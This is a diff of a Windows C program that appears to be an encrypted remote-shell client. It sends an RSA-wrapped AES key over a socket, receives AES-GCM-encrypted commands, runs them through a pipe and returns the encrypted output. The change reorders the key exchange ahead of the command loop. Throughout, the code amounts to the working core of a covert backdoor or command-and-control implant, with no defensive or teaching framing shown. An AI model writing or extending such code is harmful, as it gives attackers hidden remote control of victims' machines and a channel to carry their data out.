@@ -262,6 +262,7 @@ int main()
         sizeof(rsaEncrypted),
         &rsaEncryptedLen,
         BCRYPT_PAD_OAEP);
+
     if (!BCRYPT_SUCCESS(status))
     {
         BCryptDestroyKey(rsaKey);
@@ -273,6 +274,21 @@ int main()
         BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
         return 0;
     }
+
+    // First response: send RSA-encrypted AES session key.
+    // Message format: [4-byte total length] [1-byte type=0x01] [RSA-encrypted AES key]
+    // Total length includes the type byte, so it's rsaEncryptedLen + 1
+    ULONG totalLen = rsaEncryptedLen + 1;
+    char header[5];
+    header[0] = (char)(totalLen & 0xFF);
+    header[1] = (char)((totalLen >> 8) & 0xFF);
+    header[2] = (char)((totalLen >> 16) & 0xFF);
+    header[3] = (char)((totalLen >> 24) & 0xFF);
+    header[4] = 0x01; // Type: RSA-encrypted AES key
+
+    send_all(soc, header, sizeof(header));
+    send_all(soc, (char *)rsaEncrypted, (int)rsaEncryptedLen);
+    rsaUsed = 1;
 
     BCryptDestroyKey(rsaKey);
     rsaKey = NULL;
@@ -289,6 +305,7 @@ int main()
         checker = recv_all(soc, rcvbuffer, 4);
         if (checker <= 0)
             return 1; // error in recv_all
+
         unsigned int cmdlen = (unsigned char)rcvbuffer[0] |
                               ((unsigned char)rcvbuffer[1] << 8) |
                               ((unsigned char)rcvbuffer[2] << 16) |
@@ -296,6 +313,7 @@ int main()
         // Receive the encrypted command payload and decrypt it using AES-GCM.
         // cmdlen is the binary ciphertext length, not a string length.
         recv_all(soc, received_message, cmdlen);
+
         if (rsaUsed != 0)
         {
             decrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)received_message, (int)cmdlen,
@@ -323,48 +341,29 @@ int main()
                 char buf[512];
                 char result_buf[512];
                 int send_result;
+
                 while (fgets(buf, sizeof(buf), pipe) != NULL)
                 {
                     // On the first command response we send the RSA-encrypted AES session key.
                     // Subsequent responses are encrypted with AES-GCM using the same AES session key.
-                    if (rsaUsed == 0)
-                    {
-                        // First response: send RSA-encrypted AES session key.
-                        // Message format: [4-byte total length] [1-byte type=0x01] [RSA-encrypted AES key]
-                        // Total length includes the type byte, so it's rsaEncryptedLen + 1
-                        ULONG totalLen = rsaEncryptedLen + 1;
-                        char header[5];
-                        header[0] = (char)(totalLen & 0xFF);
-                        header[1] = (char)((totalLen >> 8) & 0xFF);
-                        header[2] = (char)((totalLen >> 16) & 0xFF);
-                        header[3] = (char)((totalLen >> 24) & 0xFF);
-                        header[4] = 0x01; // Type: RSA-encrypted AES key
+                    // Encrypt command output with AES-GCM.
+                    encrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)buf, (int)strlen(buf),
+                                    result_buf, sizeof(result_buf), &ciphertext_len,
+                                    tag, sizeof(tag));
 
-                        send_all(soc, header, sizeof(header));
-                        send_all(soc, (char *)rsaEncrypted, (int)rsaEncryptedLen);
-                        rsaUsed = 1;
-                    }
-                    else
-                    {
-                        // Encrypt command output with AES-GCM.
-                        encrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)buf, (int)strlen(buf),
-                                        result_buf, sizeof(result_buf), &ciphertext_len,
-                                        tag, sizeof(tag));
+                    // Send message format: [4-byte total length] [1-byte type=0x02] [AES-encrypted output]
+                    // Total length includes the type byte
+                    ULONG totalLen = ciphertext_len + 1;
+                    char msg_header[5];
+                    msg_header[0] = (char)(totalLen & 0xFF);
+                    msg_header[1] = (char)((totalLen >> 8) & 0xFF);
+                    msg_header[2] = (char)((totalLen >> 16) & 0xFF);
+                    msg_header[3] = (char)((totalLen >> 24) & 0xFF);
+                    msg_header[4] = 0x02; // Type: AES-encrypted data
 
-                        // Send message format: [4-byte total length] [1-byte type=0x02] [AES-encrypted output]
-                        // Total length includes the type byte
-                        ULONG totalLen = ciphertext_len + 1;
-                        char msg_header[5];
-                        msg_header[0] = (char)(totalLen & 0xFF);
-                        msg_header[1] = (char)((totalLen >> 8) & 0xFF);
-                        msg_header[2] = (char)((totalLen >> 16) & 0xFF);
-                        msg_header[3] = (char)((totalLen >> 24) & 0xFF);
-                        msg_header[4] = 0x02; // Type: AES-encrypted data
-
-                        send_result = send_all(soc, msg_header, sizeof(msg_header));
-                        if (send_result > 0)
-                            send_result = send_all(soc, result_buf, ciphertext_len);
-                    }
+                    send_result = send_all(soc, msg_header, sizeof(msg_header));
+                    if (send_result > 0)
+                        send_result = send_all(soc, result_buf, ciphertext_len);
 
                     // send_result = send(soc, buf, (int)strlen(buf), 0);
                     if (send_result <= 0)
